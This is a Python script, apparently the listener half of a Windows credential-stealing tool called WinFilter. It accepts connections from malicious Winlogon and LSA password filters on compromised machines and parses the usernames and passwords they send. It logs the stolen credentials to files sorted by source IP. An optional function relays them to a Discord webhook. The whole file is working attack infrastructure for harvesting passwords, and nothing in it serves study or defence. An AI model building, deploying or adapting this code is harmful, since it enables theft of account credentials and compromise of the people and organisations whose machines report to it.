import socket
import requests
import threading
import argparse
import os
import datetime

print_lock = threading.Lock()


def handle_client(conn, addr):
    data = conn.recv(1024)
    strData = str(data)
    #print(strData) #debugging
    if '@@' in strData: #winlogon
        type = 'WinLogon'
        username = strData[2:strData.find('@@')]
    else:
        type = 'Password Change'
        username = strData[2:strData.find(':')]
    password = strData[strData.find(':')+1:strData.find(';end')]
    timestamp = datetime.datetime.now().strftime("%G-%m-%d %H:%M:%S")
    storage = f"\nTimestamp: {timestamp}\nSource: {addr[0]}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
    print(storage)

    # discordWH(addr[0], username, password)

    writeFile(storage, addr)

    if not data:
        print_lock.release()


def discordWH(addr, username, password):
    url = "" # modify this

    # Setup Post Request
    post = {}
    data = {
        "content" : f"{addr} | {username}:{password}",
        "username" : "WinFilter"
    }

    # Send and check result
    result = requests.post(url, json = data)
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print("Payload delivered successfully, code {}.".format(result.status_code))


def writeFile(storage, addr):
    ip = addr[0]
    with open(f'creds/{ip}', 'a') as f:
        f.write(storage)


def main():
    print("""                                                                                                                     

  _____            ____  _____   ______         _____   ____  ____      _________________      ______        _____   
 |\    \   _____  |    ||\    \ |\     \   ____|\    \ |    ||    |    /                 \ ___|\     \   ___|\    \  
 | |    | /    /| |    | \\    \| \     \ |    | \    \|    ||    |    \______     ______/|     \     \ |    |\    \ 
 \/     / |    || |    |  \|    \  \     ||    |______/|    ||    |       \( /    /  )/   |     ,_____/||    | |    |
 /     /_  \   \/ |    |   |     \  |    ||    |----'\ |    ||    |  ____  ' |   |   '    |     \--'\_|/|    |/____/ 
|     // \  \   \ |    |   |      \ |    ||    |_____/ |    ||    | |    |   |   |        |     /___/|  |    |\    \ 
|    |/   \ |    ||    |   |    |\ \|    ||    |       |    ||    | |    |  /   //        |     \____|\ |    | |    |
|\ ___/\   \|   /||____|   |____||\_____/||____|       |____||____|/____/| /___//         |____ '     /||____| |____|
| |   | \______/ ||    |   |    |/ \|   |||    |       |    ||    |     |||`   |          |    /_____/ ||    | |    |
 \|___|/\ |    | ||____|   |____|   |___|/|____|       |____||____|_____|/|____|          |____|     | /|____| |____|
    \(   \|____|/   \(       \(       )/    )/           \(    \(    )/     \(              \( |_____|/   \(     )/  
     '      )/       '        '       '     '             '     '    '       '               '    )/       '     '   
            '                                                                                     '                  
""")
    parser = argparse.ArgumentParser(description="Receive creds from Winlogon + LSA Filters")
    parser.add_argument('--ip', type=str, nargs='?', const=1, help="IP to listen on (default: 0.0.0.0)", default='0.0.0.0')
    parser.add_argument('--port', type=int, nargs='?', const=1, help="Port to listen on (default: 80)", default=80)
    parser.add_argument('--clean', dest='clean', action='store_true')
    parser.set_defaults(clean=False)
    args = parser.parse_args()

    if args.clean:
        os.system("rm -rf creds; mkdir creds")

    s = socket.socket() 
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(f"Listening on {args.ip}:{args.port}\n")
    s.bind((args.ip, args.port)) 
    s.listen(100) 

    try:
        while True:
            conn, addr = s.accept() 
            t = threading.Thread(target=handle_client, args=(conn, addr))
            t.start()
            
    except KeyboardInterrupt:
	    print("\nArrivederci!")
	    exit(0)

main()
